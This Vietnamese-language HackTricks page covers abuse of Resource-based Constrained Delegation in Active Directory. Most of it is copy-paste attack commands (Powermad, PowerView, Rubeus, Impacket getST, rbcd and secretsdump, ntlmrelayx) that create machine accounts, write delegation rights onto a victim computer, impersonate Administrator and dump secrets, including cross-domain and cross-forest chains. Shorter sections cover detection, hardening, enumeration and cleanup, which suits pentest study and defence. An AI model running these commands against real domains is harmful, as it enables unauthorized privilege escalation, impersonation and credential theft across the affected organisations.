# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Kiến thức cơ bản về Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) tương tự [constrained delegation](constrained-delegation.md), nhưng hướng tin cậy bị đảo ngược. Constrained delegation truyền thống ghi lại những dịch vụ mà principal có thể ủy quyền; RBCD ghi lại trên **target resource** những principal được phép mạo danh người dùng để truy cập resource đó.<sup>[[12]](#references)</sup>

Thuộc tính _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ của đối tượng đích chứa một security descriptor xác định những principal được phép hành động thay mặt các danh tính khác để truy cập resource đó.

Một điểm khác biệt quan trọng nữa là principal có đủ **quyền ghi đối với machine account** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` và các quyền tương tự) có thể đặt _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Việc cấu hình constrained delegation truyền thống thường đòi hỏi quyền quản trị cao hơn.<sup>[[1]](#references)</sup>

Cụ thể hơn, việc thay đổi các thiết lập constrained delegation cổ điển thường bị giới hạn bởi `SeEnableDelegationPrivilege` trên domain controller; quyền này thường chỉ do các quản trị viên có đặc quyền cao nắm giữ. RBCD chuyển quyết định sang security descriptor của đối tượng đích, vì vậy quyền ghi vào thuộc tính liên quan của computer object có thể là đủ mà không cần user right đó.<sup>[[1]](#references)[[2]](#references)</sup>

### Khái niệm mới

Flag **`TrustedToAuthForDelegation`** trong `userAccountControl` thường được mô tả là điều kiện tiên quyết cho **S4U2Self**, nhưng điều đó chưa đầy đủ.\
Service principal có SPN vẫn có thể yêu cầu S4U2Self mà không cần flag này. Khi có `TrustedToAuthForDelegation`, service ticket trả về sẽ **forwardable**; nếu không, ticket thường **non-forwardable**.<sup>[[5]](#references)</sup>

Constrained delegation truyền thống từ chối **TGS non-forwardable** ở bước S4U2Proxy. RBCD có thể chấp nhận ticket S4U2Self đó nếu security descriptor của đích cho phép service yêu cầu thực hiện việc này.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Cấu trúc tấn công

> Nếu bạn có **quyền tương đương ghi** đối với một **computer account**, bạn có thể giành quyền truy cập có đặc quyền vào máy đó.

Giả sử kẻ tấn công đã có **quyền tương đương ghi đối với victim computer object**.

1. Kẻ tấn công **chiếm quyền kiểm soát** một account có **SPN** hoặc **tạo một account** ("Service A"). Theo mặc định, người dùng domain đã xác thực có thể tạo tối đa 10 computer object, theo giới hạn **_MachineAccountQuota_**; computer object tự động cung cấp các SPN có thể sử dụng.
2. Kẻ tấn công **lạm dụng quyền WRITE** trên victim computer (ServiceB) để cấu hình **resource-based constrained delegation, cho phép ServiceA mạo danh bất kỳ người dùng nào** đối với victim computer đó (ServiceB).
3. Kẻ tấn công dùng Rubeus để thực hiện **cuộc tấn công S4U đầy đủ** (S4U2Self và S4U2Proxy) từ Service A đến Service B, nhắm vào một người dùng **có quyền truy cập đặc quyền vào Service B**.
   1. S4U2Self (từ account SPN bị chiếm quyền kiểm soát hoặc mới tạo): yêu cầu **TGS đại diện cho Administrator đến Service A** (non-forwardable).
   2. S4U2Proxy: dùng **TGS non-forwardable** đó để yêu cầu service ticket đại diện cho **Administrator** đến **victim host**.
   3. Ticket non-forwardable vẫn có thể hoạt động trong luồng RBCD này vì Service A được cho phép trong security descriptor của target resource.
4. Kẻ tấn công có thể **pass-the-ticket** và **mạo danh** người dùng để giành **quyền truy cập vào victim ServiceB**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` đóng đường tạo computer mặc định, nhưng không xóa quyền ghi trên target computer object hoặc quyền kiểm soát một account hiện có. Người dùng thông thường bị kiểm soát nhưng không có SPN đôi khi vẫn có thể được dùng làm principal ủy quyền thông qua [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd), kể cả trong cùng một domain. Đường này vẫn cần có quyền ghi RBCD thực sự, quyền kiểm soát thông tin xác thực của người dùng ủy quyền, danh tính bị mạo danh có thể được ủy quyền, hành vi mã hóa Kerberos tương thích và việc thay đổi NT hash làm gián đoạn account. Hãy xem đây là các điều kiện tiên quyết riêng biệt; chỉ riêng thuộc tính RBCD trống hoặc quota bằng 0 không chứng minh được rằng tấn công thành công hay hệ thống an toàn.

Một RBCD descriptor hiện có cũng có thể chỉ định một **group** thay vì trực tiếp chỉ định computer dùng để ủy quyền. Nếu bạn kiểm soát một computer account có SPN và có thể thêm account đó vào group, membership mới có thể tạo ra đường ủy quyền mà không cần thay đổi thuộc tính RBCD của target computer. Trước khi kết luận đường này hoạt động, hãy kiểm tra ACL ghi membership có hiệu lực của group (bao gồm deny ACE), membership lồng nhau và việc làm mới token, trustee SID trong descriptor, các hạn chế ủy quyền của account bị mạo danh và SPN của target service.

Để kiểm tra _**MachineAccountQuota**_ của domain, bạn có thể dùng:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Tấn công

### Tạo đối tượng máy tính

Bạn có thể tạo một đối tượng máy tính trong domain bằng **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Cấu hình ủy quyền bị giới hạn dựa trên tài nguyên

**Sử dụng mô-đun PowerShell Active Directory**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Sử dụng powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Thực hiện một cuộc tấn công S4U hoàn chỉnh (Windows/Rubeus)

Trước tiên, chúng ta đã tạo đối tượng máy tính mới với mật khẩu `123456`, vì vậy cần hash của mật khẩu đó:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Lệnh này sẽ in ra các hash RC4 và AES của tài khoản đó.\
Giờ đây, có thể thực hiện cuộc tấn công:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Bạn có thể tạo thêm nhiều ticket cho nhiều dịch vụ chỉ bằng một lần yêu cầu, sử dụng tham số `/altservice` của Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Người dùng có thể được đánh dấu **"Tài khoản nhạy cảm và không thể ủy quyền."** Nếu bật cờ này, không thể mạo danh tài khoản thông qua luồng ủy quyền này. BloodHound hiển thị thuộc tính này trong quá trình phân tích.

### Công cụ Linux: RBCD end-to-end với Impacket (2024+)

Nếu bạn thao tác trên Linux, bạn có thể thực hiện toàn bộ chuỗi RBCD bằng các công cụ Impacket chính thức:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Ghi chú
- Nếu LDAP signing/LDAPS được áp dụng, hãy dùng `impacket-rbcd -use-ldaps ...`.
- Ưu tiên khóa AES; nhiều domain hiện đại hạn chế RC4. Impacket và Rubeus đều hỗ trợ các luồng chỉ dùng AES.
- Impacket có thể viết lại `sname` ("AnySPN") cho một số công cụ, nhưng hãy lấy SPN chính xác bất cứ khi nào có thể (ví dụ: CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD giữa các domain và forest

Nếu **principal ủy quyền** mà bạn kiểm soát nằm trong **domain khác** (hoặc thậm chí **forest khác**) với **máy tính tài nguyên**, thì kỹ thuật khai thác vẫn là **RBCD**, nhưng luồng ticket không còn là `S4U2Self -> S4U2Proxy` thông thường trong một domain.

### RBCD giữa các domain: cấu hình foreign principal bằng SID

Khi bạn đặt `msDS-AllowedToActOnBehalfOfOtherIdentity` từ **domain khác**, máy hoặc người dùng bên ngoài có thể **không phân giải được theo tên** trong LDAP của domain mục tiêu. Trong trường hợp đó, hãy cấu hình mục ủy quyền bằng **SID** của foreign principal thay vì sAMAccountName/UPN.

Điều này đặc biệt hữu ích khi relay NTLM đến LDAP bằng `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Ghi chú:
- `--sid` yêu cầu `ntlmrelayx.py` xem `--escalate-user` là SID; điều này cần thiết khi tài khoản ủy quyền thuộc domain khác với domain mục tiêu.
- Ngay cả khi công cụ in ra `User not found in LDAP`, thao tác ghi thông tin ủy quyền vẫn có thể thành công vì security descriptor lưu trực tiếp SID bên ngoài.

### RBCD liên miền: chuỗi S4U cross-realm

Khi principal bên ngoài đã được thêm vào `msDS-AllowedToActOnBehalfOfOtherIdentity`, luồng liên miền hoạt động như sau:<sup>[[9]](#references)[[13]](#references)</sup>

1. Lấy **TGT** cho principal ủy quyền từ domain của chính principal đó.
2. Yêu cầu **referral TGT** cho `krbtgt/<target-domain>`.
3. Yêu cầu **cross-realm S4U2Self referral** cho người dùng bị mạo danh trên DC của target-domain.
4. Yêu cầu ticket **S4U2Self** thực tế cho người dùng đó trong domain của bên ủy quyền.
5. Thực hiện **S4U2Proxy** trong domain của bên ủy quyền để lấy referral ticket cho target domain.
6. Thực hiện **S4U2Proxy** cuối cùng trên DC của target-domain để lấy service ticket cho `cifs/host.target`, `host/host.target`, v.v.

Đây là lý do các công cụ Linux thông thường thường thất bại với RBCD liên miền:<sup>[[9]](#references)</sup>
- **realm** trong yêu cầu có thể cần khác với realm của TGT được dùng trong `TGS-REQ`
- chuỗi này cần các bước **S4U2Proxy độc lập**, chứ không chỉ có `S4U2Self` hoặc `S4U2Self` theo sau ngay bởi một lần `S4U2Proxy`

### RBCD liên miền từ Linux

Synacktiv đã công bố một triển khai Impacket `getST.py` tái hiện chuỗi cross-realm từ Linux bằng cách xử lý riêng hai KDC:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Về mặt vận hành, các đối số mới là:
- `-dc-ip`: DC của domain **ủy quyền**
- `-targetdomain`: domain của **máy tính tài nguyên**
- `-targetdc`: DC của domain **tài nguyên**

### Các hạn chế của RBCD xuyên forest

RBCD xuyên forest có một hạn chế quan trọng: **user bị mạo danh phải thuộc cùng forest với principal ủy quyền**. Nói cách khác, nếu machine account bạn kiểm soát nằm trong `valhalla.local` còn tài nguyên mục tiêu nằm trong `asgard.local`, thông thường bạn **không thể mạo danh các user `asgard.local` tùy ý để truy cập tài nguyên đó qua RBCD**.<sup>[[9]](#references)</sup>

Kỹ thuật này vẫn có thể khai thác được khi:
- user thuộc **forest ủy quyền** là **local admin** (hoặc có đặc quyền theo cách khác) trên host tài nguyên trong forest còn lại
- trust cho phép đường xác thực cần thiết và SID bên ngoài được chấp nhận trong security descriptor của máy tính mục tiêu

### Các điểm khác biệt của giao thức RBCD xuyên forest

RBCD xuyên forest không chỉ là “xuyên domain cộng thêm một trust”. Luồng đã quan sát được bao gồm hai điểm khác biệt mà các công cụ phổ biến trước đây thường bỏ sót:<sup>[[9]](#references)</sup>

1. Một yêu cầu **S4U2Proxy** bổ sung, đặt **`PA-PAC-OPTIONS=branch-aware`**
2. Service ticket cuối cùng có thể được trả về bằng **RC4**, ngay cả khi đã yêu cầu các etype khác

Luồng thực tế như sau:

1. Lấy TGT cho principal ủy quyền trong forest A.
2. Yêu cầu **S4U2Self** cho user bị mạo danh trong forest A.
3. Yêu cầu **S4U2Proxy** trong forest A để lấy referral TGT cho forest B.
4. Gửi yêu cầu **S4U2Proxy** thứ hai trong forest A **không kèm ticket S4U2Self dưới dạng additional ticket**, nhưng bật `branch-aware`, để lấy một referral TGT khác cho forest B.
5. Tùy chọn, yêu cầu service ticket thông thường trong forest B cho principal ủy quyền (ticket này không bắt buộc để thực hiện hành vi lạm dụng cuối cùng).
6. Dùng các referral ticket ở bước 3 và 4 để yêu cầu ticket **S4U2Proxy** cuối cùng trong forest B, cho user thuộc forest A bị mạo danh truy cập SPN mục tiêu.

### RBCD xuyên forest từ Linux

Cùng nhánh Impacket của Synacktiv bổ sung switch `-forest` cho logic này:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### RBCD đệ quy đa miền (3+ miền)

Trong **forest đa miền**, cả **S4U2Self** và **S4U2Proxy** đều có thể **đệ quy** thay vì dừng lại sau một lần referral:

- **S4U2Self đệ quy**: `S4U2Self` đầu tiên được gửi đến **miền của người dùng bị mạo danh**, các bước trung gian qua miền cha/con được thực hiện bằng referral `TGS-REQ` thông thường cho `krbtgt/<REALM>`, và **S4U2Self cuối cùng** được gửi trong **miền riêng của principal ủy quyền**.
- Điều này có nghĩa là **chỉ cần nắm giữ TGT** của một machine account là đủ để mạo danh **quản trị viên từ một miền khác trong cùng forest** và yêu cầu `cifs/host`, `host/host`, `wsman/host`, v.v.
- **S4U2Proxy đệ quy** đi theo trust chain theo cách tương tự: các bước trung gian dùng lại ticket trước đó làm TGT khi yêu cầu referral `krbtgt/<REALM>` tiếp theo, và chỉ bước cuối cùng mới trả về service ticket cuối cùng.<sup>[[10]](#references)</sup>

Một ví dụ thực tế trong cùng forest là:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### RBCD không có SPN xuyên miền / xuyên forest

Nếu **principal ủy quyền là một user không có SPN**, lần `S4U2Self` đệ quy cuối cùng sẽ thất bại với **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Cách khắc phục là **chỉ thử lại bước cuối bằng `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Tóm tắt chuỗi khai thác:

1. Xác thực bằng **NT hash** để buộc KDC ưu tiên **RC4-HMAC (etype 23)**.
2. Trước tiên, yêu cầu **`-self -u2u`** và giữ ticket này riêng, không dùng chung với bước proxy sau đó.
3. Trích xuất **khóa phiên TGT** bằng `describeTicket.py`.
4. Thay **NT hash** của user bằng **khóa phiên** đó bằng `changepasswd.py -newhashes <session_key>`.
5. Dùng lại ticket `S4U2Self+U2U` làm **`-additional-ticket`** trong một yêu cầu **`-proxy`** riêng.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Các lưu ý khi vận hành:

- Khi **hop đáng tin cậy đầu tiên đã là một forest khác**, hãy ưu tiên thuật toán **branch-aware** (`getST.py ... -forest`) để khớp với hành vi gốc của Windows. Nếu chỉ đến được foreign forest ở một đoạn sau trong chuỗi, luồng đệ quy không branch-aware vẫn có thể hoạt động.<sup>[[9]](#references)</sup>
- Trên các DC **Windows Server 2022/2025** gần đây, việc ép dùng RC4 có thể thất bại với **`KDC_ERR_ETYPE_NOSUPP`** do RC4 bị loại bỏ; điều này có thể khiến **RBCD không có SPN trở nên bất khả thi**, dù RBCD dựa trên SPN thông thường vẫn hoạt động với AES.<sup>[[15]](#references)</sup>
- Chạy **`S4U2Self+U2U` trước khi thay đổi hash/password của người dùng**: **`SamrChangePasswordUser`** không tính lại các khóa Kerberos AES của tài khoản, vì vậy đổi password trước có thể khiến các yêu cầu ticket về sau thất bại.<sup>[[14]](#references)</sup>
- Tài khoản bị mạo danh vẫn phải **được phép ủy quyền**: **Protected Users** và các tài khoản có **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** sẽ chặn chuỗi này.

## Ghi chú về phát hiện / tăng cường bảo mật

- Các đường dẫn RBCD xuyên domain/forest thường vẫn được tạo thông qua **lạm dụng ACL** hoặc **relay-to-LDAP**. Bật thực thi **LDAP signing** và **LDAP channel binding** trên DC để phá vỡ các cách thiết lập phổ biến.
- Kiểm tra những ai có thể ghi `msDS-AllowedToActOnBehalfOfOtherIdentity` trên các computer object và phân giải các SID được lưu trữ, bao gồm cả **foreign security principal**.
- Trong các môi trường có nhiều trust, hãy rà soát **Selective Authentication**, **SID filtering** và việc người dùng từ foreign forest có quyền **local admin** trên các host tài nguyên hay không.

### Truy cập

Dòng lệnh cuối cùng sẽ thực hiện **toàn bộ cuộc tấn công S4U và inject TGS** từ Administrator vào host nạn nhân trong **bộ nhớ**.\
Trong ví dụ này, một TGS cho dịch vụ **CIFS** đã được yêu cầu từ Administrator, vì vậy bạn sẽ có thể truy cập **C$**:

```bash
ls \\victim.domain.local\C$
```

### Lạm dụng các service ticket khác nhau

Tìm hiểu về [**các service ticket hiện có tại đây**](silver-ticket.md#available-services).

## Liệt kê, kiểm tra và dọn dẹp

### Liệt kê các máy tính đã cấu hình RBCD

PowerShell (giải mã SD để phân giải SID):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (đọc hoặc xóa bằng một lệnh):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Dọn dẹp / đặt lại RBCD

- PowerShell (xóa thuộc tính):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Lỗi Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Điều này có nghĩa là Kerberos được cấu hình để không dùng DES hoặc RC4, nhưng bạn chỉ cung cấp hash RC4. Hãy cung cấp cho Rubeus ít nhất hash AES256 (hoặc cung cấp cả hash rc4, aes128 và aes256). Ví dụ: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** khi dùng `-self` cho một người dùng bình thường: principal ủy quyền có thể **không có SPN**. Thử lại **hop cuối cùng** bằng **`S4U2Self+U2U`** thay vì `S4U2Self` thông thường.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** khi dùng **RBCD không có SPN**: các DC mới có thể từ chối đường đi **RC4-HMAC** bắt buộc cho thủ thuật `S4U2Self+U2U` + thay thế session key. Thay vào đó, hãy thử đường đi RBCD cổ điển có **SPN** với AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Điều này có nghĩa là thời gian trên máy tính hiện tại khác với thời gian trên DC, khiến Kerberos hoạt động không chính xác.
- **`preauth_failed`**: Điều này có nghĩa là username + hash được cung cấp không dùng để đăng nhập được. Có thể bạn đã quên thêm "$" vào username khi tạo hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Có thể là do:
  - Người dùng bạn đang giả mạo không thể truy cập dịch vụ mong muốn (vì bạn không thể giả mạo người dùng đó hoặc họ không có đủ quyền)
  - Dịch vụ được yêu cầu không tồn tại (nếu bạn yêu cầu ticket cho winrm nhưng winrm không chạy)
  - fakecomputer được tạo đã mất quyền trên máy chủ dễ bị tấn công và bạn cần cấp lại quyền cho nó.
  - Bạn đang lạm dụng KCD cổ điển; hãy nhớ RBCD hoạt động với ticket S4U2Self không thể chuyển tiếp, còn KCD yêu cầu ticket có thể chuyển tiếp.

## Ghi chú, relay và các lựa chọn thay thế

- Bạn cũng có thể ghi RBCD SD qua AD Web Services (ADWS) nếu LDAP bị lọc. Xem:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Các chuỗi Kerberos relay thường kết thúc bằng RBCD để đạt được quyền SYSTEM cục bộ chỉ trong một bước. Xem các ví dụ thực tế từ đầu đến cuối:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Nếu LDAP signing/channel binding **bị tắt** và bạn có thể tạo machine account, các công cụ như **KrbRelayUp** có thể relay Kerberos auth bị ép buộc đến LDAP, đặt `msDS-AllowedToActOnBehalfOfOtherIdentity` cho machine account của bạn trên computer object mục tiêu, rồi ngay lập tức giả mạo **Administrator** qua S4U từ máy bên ngoài.<sup>[[8]](#references)</sup>

## References

- [1] [Vẫy đuôi: Lạm dụng Resource-Based Constrained Delegation để tấn công Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Một góc nhìn khác về Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Chiếm quyền Computer Object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Lạm dụng Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity đã khiến Domain sụp đổ: Tổng quan về Kerberos theo hướng tấn công](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (chính thức)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Cheatsheet Linux nhanh với cú pháp mới](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (tắt LDAP signing → Kerberos relay sang RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Khám phá RBCD liên miền và liên forest](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Khám phá RBCD liên miền và liên forest: phần 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Nhánh Impacket của Synacktiv - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Tổng quan về Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - S4U2Self liên miền](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Phát hiện và khắc phục việc sử dụng RC4 trong Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Chi tiết về S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
